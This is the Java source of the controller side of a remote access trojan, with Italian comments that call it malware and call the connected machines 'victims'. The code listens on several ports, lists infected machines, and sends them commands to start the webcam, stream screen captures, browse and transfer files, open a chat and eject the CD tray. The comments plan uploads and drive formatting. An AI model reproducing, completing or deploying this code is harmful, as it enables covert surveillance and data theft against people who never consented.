package src;

/*
 * RAT N0H Java mlwr v b 0.4
 * 
 * nei successivi ritocchi dovrò imlpementare file explorer ecc..
 * per adesso ho aggiunto un nuovo thread con un propio flusso in/out
 * per adesso il flusso del thread è solo out dal client e in dal server (posso solo ricevere dal client)
 * ma la funzione non è ancora un file transfer vero e propio 
 * per adesso stampo solamente la directori c:// della vittima) .
 * 
 * e non viceversa , nelle successive versioni implementerò la funzione 
 * in out sia server che client 
 * cosi da poter anche usufruire della funzione di upoload
 * 
 * 
 * nelle versioni successive dovrò aggiungere la funzione 
 * format c
 * shutdown ecc     //roba da lamer che penso non inserirò sinceramente!!
 * easy job
 *
 * N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H 
 * God --------I--------------------------------------------------------/
 * bless-------SEE-----------------------------------------------------/   knock knock, hey neo wake up ...
 * the---------U------------------------------------------------------/         follow the white Rabbit
 * dead--------!-----------------------------------------------------/
 * N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H  N0H 
 */

import java.awt.EventQueue;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

import javax.swing.JFrame;
import javax.swing.JMenuBar;
import javax.swing.JMenu;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;

import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;
import javax.swing.SpringLayout;
import javax.imageio.ImageIO;
import javax.swing.DefaultListModel;
import javax.swing.JButton;
import javax.swing.JList;
import javax.swing.JPanel;
import java.awt.Toolkit;
import javax.swing.JLabel;

public class ServerFrame extends Thread {

	private JFrame frame;
	private ServerSocket srvsock;

	private Socket sock;
	private int clientCount = 0;
	public static JList<String> list;

public static DefaultListModel<String> dlm;
	static int id = 0;
	static JPanel panel;
	static ServerThread thr;
	static ServerSocket srvimg;
	static ServerSocket WCSSock;
	static ServerSocket fTSock;
	static ServerSocket FTsock;
	// variabile del metodo che è ancora da implementare
	boolean chatIsVisible = false;

	static int vlistid = 0;
	// qui suddividerò in final tutte le string
	// per mandare comandi al server
	// tramite flusso in out del socket, con le string e
	// con condizioni booleane, che mi permetterano
	// di eseguire quella parte di codice se torna true.
	static final String OPEN_CD = "ssCD_OPEN";
	static final String CLOSE_CD = "ssCD_CLOSE";
	static final String START_STREAM = "ssSTARTSCREEN";
	static final String START_CHAT = "ssSTARTCHAT";
	// si, praticamente ho intenzione di mandare
	// comandi al server(in questo caso il client) like a shell xD
	// it works :D
	/*
	 * per adesso il metodo descritto sopra è l'unico che conosco per far eseguire
	 * comandi al client over network, oviamente i metodi sono istanziati nel client
	 * e poi vengono richiamati tramite stringe, cosi che il flusso in/out del
	 * client e del server non funga da sola chat ma anche da stream che attende
	 * info, e se la stringa corrisponde a quella per avviare il comando: parte il
	 * metodo . EASY
	 */

	public Boolean chatIsVisible() {

		Client window = new Client();
		window.frame.setVisible(true);

		return this.chatIsVisible = true;
	}

	void serverStart() throws IOException {

		// in/out sock
		srvsock = new ServerSocket(5000);
		// screen capture sock
		srvimg = new ServerSocket(5020);
		// webcam sock
		WCSSock = new ServerSocket(6000);
		//FTThread in/out cmd
		fTSock = new ServerSocket(5402);
		//FTsock
		FTsock = new ServerSocket(8765); 

		while (true) {

			try {

				sock = srvsock.accept();
				thr = new ServerThread(sock, clientCount);
				WebcamThread wt = new WebcamThread();
				clientCount++;
				// ServerThread start
				thr.start();
				// WebcamThread attesa connessioni start
				wt.start();
				//fTTAttendi connessione
				ServerAttendiFTThread saftt = new ServerAttendiFTThread();
				saftt.start();
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

		}

	}

	public static void main(String[] args) throws IOException {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					ServerFrame window = new ServerFrame();
					window.frame.setVisible(true);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});

		ServerFrame window = new ServerFrame();
		window.serverStart();

	}

	/**
	 * Create the application.
	 */
	public ServerFrame() {
		initialize();
	}

	/**
	 * Initialize the contents of the frame.
	 */
	private void initialize() {
		frame = new JFrame();
		frame.setIconImage(Toolkit.getDefaultToolkit()
				.getImage(ServerFrame.class.getResource("/com/sun/java/swing/plaf/windows/icons/Computer.gif")));
		frame.setBounds(100, 100, 753, 553);
		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

		JMenuBar menuBar = new JMenuBar();
		frame.setJMenuBar(menuBar);

		JMenu mnNewMenu = new JMenu("Chat");
		menuBar.add(mnNewMenu);

		JMenuItem mntmOpenchat = new JMenuItem("OpenChat");
		mntmOpenchat.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {

				Object[] options = { "OK", "CANCEL" };
				int a = JOptionPane.showOptionDialog(null,
						"andando avanti il client installato sul pc " + "\n"
								+ "verra mostrato alla vittima, Continuare?",
						"Warning", JOptionPane.YES_NO_OPTION, JOptionPane.WARNING_MESSAGE, null, options, options[0]);

				if (a == JOptionPane.YES_OPTION) {

					ServerChat.serverChatIsStart();

//				}if(a == JOptionPane.YES_OPTION ) {
//					try {
//						ServerThread.out.writeUTF(START_CHAT);
//					} catch (IOException e) {
//						// TODO Auto-generated catch block
//						e.printStackTrace();
//					}
//					
				}

				else {

					Object[] options1 = { "OK" };
					JOptionPane.showOptionDialog(null, "Featuring coming soon ", "Warning",
							JOptionPane.INFORMATION_MESSAGE, JOptionPane.WARNING_MESSAGE, null, options1, options1[0]);

				}

			}
		});

		mnNewMenu.add(mntmOpenchat);

		JMenu mnNewMenu_1 = new JMenu("Change Victim");
		menuBar.add(mnNewMenu_1);

		JMenuItem mntmNewMenuItem_1 = new JMenuItem("previous");
		mntmNewMenuItem_1.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {

				try {

					id = 0;

					ServerThread.out = new DataOutputStream(ServerThread.clients.get(0).getOutputStream());
					ServerFTThread.ftin = new DataInputStream(ServerFTThread.ftlist.get(0).getInputStream());
                    ServerFTThread.ftout = new DataOutputStream(ServerFTThread.ftlist.get(0).getOutputStream());
                    ServerFTThread.FTin = new DataInputStream(ServerFTThread.FTlist.get(0).getInputStream());
                    
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

			}
		});
		mnNewMenu_1.add(mntmNewMenuItem_1);

		JMenuItem mntmNewMenuItem = new JMenuItem("next");
		mntmNewMenuItem.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {

				try {
					
					if( ServerFrame.id < ServerThread.clients.size()) {

					ServerFrame.id++;

					//in/out cmd chat
					ServerThread.out = new DataOutputStream(ServerThread.clients.get(id).getOutputStream());
					//in/out File Transfer chat
					ServerFTThread.ftout = new DataOutputStream(ServerFTThread.ftlist.get(id).getOutputStream());
					ServerFTThread.ftin = new DataInputStream(ServerFTThread.ftlist.get(id).getInputStream());
					// in --file--
                    ServerFTThread.FTin = new DataInputStream(ServerFTThread.FTlist.get(id).getInputStream());

					}
				} catch (IOException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}

			}
		});
		mnNewMenu_1.add(mntmNewMenuItem);

		JMenu mnEncryptData = new JMenu("Encrypt Data");
		menuBar.add(mnEncryptData);

		JMenuItem mntmAesEncrypt = new JMenuItem("AES Encrypt");
		mntmAesEncrypt.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {

				EncryptFrame window = new EncryptFrame();
				window.frame.setVisible(true);

			}
		});
		mnEncryptData.add(mntmAesEncrypt);

		JMenu mnNewMenu_2 = new JMenu("CreateServer");
		menuBar.add(mnNewMenu_2);

		JMenuItem mntmNewMenuItem_2 = new JMenuItem("New menu item");
		mnNewMenu_2.add(mntmNewMenuItem_2);

		JMenu mnNewMenu_3 = new JMenu("Webcam capture");
		menuBar.add(mnNewMenu_3);

		JMenuItem mntmWebcamCapture = new JMenuItem("WebCam Capture");
		mntmWebcamCapture.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {

				WebcamFrame window = new WebcamFrame();
				window.frame.setVisible(true);
				try {
					
					ServerThread.out.writeUTF("webcamstart");
					System.out.println("[+]Webcam Thread Started: Server");

				} catch (IOException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}

			}
		});
		mnNewMenu_3.add(mntmWebcamCapture);

		JMenuItem mntmWebcamStop = new JMenuItem("Webcam stop");
		mntmWebcamStop.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {

				try {
					ServerThread.out.writeUTF("webcamstop");
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		});
		mnNewMenu_3.add(mntmWebcamStop);
		SpringLayout springLayout = new SpringLayout();
		frame.getContentPane().setLayout(springLayout);

		JButton btnNewButton = new JButton("SetClientFrame As NotVisible");
		btnNewButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {

			}
		});
		springLayout.putConstraint(SpringLayout.WEST, btnNewButton, 10, SpringLayout.WEST, frame.getContentPane());
		springLayout.putConstraint(SpringLayout.SOUTH, btnNewButton, -83, SpringLayout.SOUTH, frame.getContentPane());
		frame.getContentPane().add(btnNewButton);

		JButton btnNewButton_1 = new JButton("OPEN");
		btnNewButton_1.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {

				try {
					ServerThread.out.writeUTF(OPEN_CD);
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

			}
		});
		springLayout.putConstraint(SpringLayout.WEST, btnNewButton_1, 10, SpringLayout.WEST, frame.getContentPane());
		springLayout.putConstraint(SpringLayout.SOUTH, btnNewButton_1, -26, SpringLayout.SOUTH, frame.getContentPane());
		springLayout.putConstraint(SpringLayout.EAST, btnNewButton_1, -645, SpringLayout.EAST, frame.getContentPane());
		frame.getContentPane().add(btnNewButton_1);

		JButton btnNewButton_2 = new JButton("FileTransfer");
		springLayout.putConstraint(SpringLayout.WEST, btnNewButton_2, 40, SpringLayout.EAST, btnNewButton);
		btnNewButton_2.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				
				Object[] options1 = { "OK" };
				JOptionPane.showOptionDialog(null, "Usare il comando (stampadir) nel terminale(il flusso in/out 'La chat')  \n" + "per stampare la Directory corrente \n"  , "N0H Warning",
						JOptionPane.INFORMATION_MESSAGE, JOptionPane.WARNING_MESSAGE, null, options1, options1[0]);

				
				FileTransferFrame window = new FileTransferFrame();
				window.frame.setVisible(true);
			}
		});
		frame.getContentPane().add(btnNewButton_2);

		JButton btnNewButton_3 = new JButton("CLOSE");
		springLayout.putConstraint(SpringLayout.EAST, btnNewButton, 0, SpringLayout.EAST, btnNewButton_3);
		btnNewButton_3.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {

				try {
					ServerThread.out.writeUTF(CLOSE_CD);
				} catch (IOException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}

			}
		});
		springLayout.putConstraint(SpringLayout.NORTH, btnNewButton_3, 0, SpringLayout.NORTH, btnNewButton_1);
		springLayout.putConstraint(SpringLayout.WEST, btnNewButton_3, 6, SpringLayout.EAST, btnNewButton_1);
		springLayout.putConstraint(SpringLayout.EAST, btnNewButton_3, 180, SpringLayout.WEST, frame.getContentPane());
		frame.getContentPane().add(btnNewButton_3);

		dlm = new DefaultListModel<String>();
		list = new JList<String>(dlm);
		springLayout.putConstraint(SpringLayout.WEST, list, -191, SpringLayout.EAST, frame.getContentPane());
		springLayout.putConstraint(SpringLayout.EAST, list, -10, SpringLayout.EAST, frame.getContentPane());
		frame.getContentPane().add(list);

		panel = new JPanel();
		springLayout.putConstraint(SpringLayout.NORTH, panel, 52, SpringLayout.NORTH, frame.getContentPane());
		springLayout.putConstraint(SpringLayout.WEST, panel, 50, SpringLayout.WEST, frame.getContentPane());
		springLayout.putConstraint(SpringLayout.SOUTH, panel, 328, SpringLayout.NORTH, frame.getContentPane());
		springLayout.putConstraint(SpringLayout.EAST, panel, 671, SpringLayout.WEST, frame.getContentPane());
		frame.getContentPane().add(panel);

		JButton btnNewButton_4 = new JButton("New button");
		springLayout.putConstraint(SpringLayout.SOUTH, btnNewButton_2, -34, SpringLayout.NORTH, btnNewButton_4);
		springLayout.putConstraint(SpringLayout.WEST, btnNewButton_4, 0, SpringLayout.WEST, btnNewButton_2);
		springLayout.putConstraint(SpringLayout.SOUTH, btnNewButton_4, 0, SpringLayout.SOUTH, btnNewButton_1);
		frame.getContentPane().add(btnNewButton_4);

		JButton btnNewButton_5 = new JButton("New button");
		springLayout.putConstraint(SpringLayout.WEST, btnNewButton_5, 43, SpringLayout.EAST, btnNewButton_2);
		frame.getContentPane().add(btnNewButton_5);

		JButton btnNewButton_6 = new JButton("New button");
		springLayout.putConstraint(SpringLayout.SOUTH, btnNewButton_5, -34, SpringLayout.NORTH, btnNewButton_6);
		springLayout.putConstraint(SpringLayout.SOUTH, btnNewButton_6, 0, SpringLayout.SOUTH, btnNewButton_1);
		springLayout.putConstraint(SpringLayout.EAST, btnNewButton_6, 0, SpringLayout.EAST, btnNewButton_5);
		frame.getContentPane().add(btnNewButton_6);

		JLabel lblNewLabel = new JLabel("open/close CD-Rom");
		springLayout.putConstraint(SpringLayout.NORTH, lblNewLabel, 6, SpringLayout.SOUTH, btnNewButton);
		springLayout.putConstraint(SpringLayout.WEST, lblNewLabel, 50, SpringLayout.WEST, frame.getContentPane());
		frame.getContentPane().add(lblNewLabel);

		JButton btnNewButton_7 = new JButton("NextScreen");
		springLayout.putConstraint(SpringLayout.SOUTH, btnNewButton_7, -115, SpringLayout.SOUTH, frame.getContentPane());
		springLayout.putConstraint(SpringLayout.NORTH, list, 6, SpringLayout.SOUTH, btnNewButton_7);
		springLayout.putConstraint(SpringLayout.EAST, btnNewButton_7, 0, SpringLayout.EAST, list);
		btnNewButton_7.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {

//					ServerThread.out.writeUTF(START_STREAM);
				if (vlistid < BufferThreadImg.vlists.size()) {
					vlistid++;
					try {
						BufferThreadImg.image = ImageIO.read(BufferThreadImg.vlists.get(vlistid).getInputStream());
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}

			}
		});
		frame.getContentPane().add(btnNewButton_7);

		JButton btnNewButton_8 = new JButton("PreviousScreen");
		springLayout.putConstraint(SpringLayout.WEST, btnNewButton_8, 10, SpringLayout.WEST, frame.getContentPane());
		springLayout.putConstraint(SpringLayout.SOUTH, btnNewButton_8, -6, SpringLayout.NORTH, btnNewButton);
		btnNewButton_8.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {

				try {

					vlistid = 0;
					BufferThreadImg.image = ImageIO.read(BufferThreadImg.vlists.get(vlistid).getInputStream());
				} catch (IOException ex) {
					// TODO Auto-generated catch block
					ex.printStackTrace();
				}

			}
		});
		frame.getContentPane().add(btnNewButton_8);

		JLabel lblVB = new JLabel("v b.0.3");
		springLayout.putConstraint(SpringLayout.NORTH, lblVB, 473, SpringLayout.NORTH, frame.getContentPane());
		springLayout.putConstraint(SpringLayout.SOUTH, list, -6, SpringLayout.NORTH, lblVB);
		springLayout.putConstraint(SpringLayout.EAST, lblVB, -10, SpringLayout.EAST, frame.getContentPane());
		frame.getContentPane().add(lblVB);
	}
}
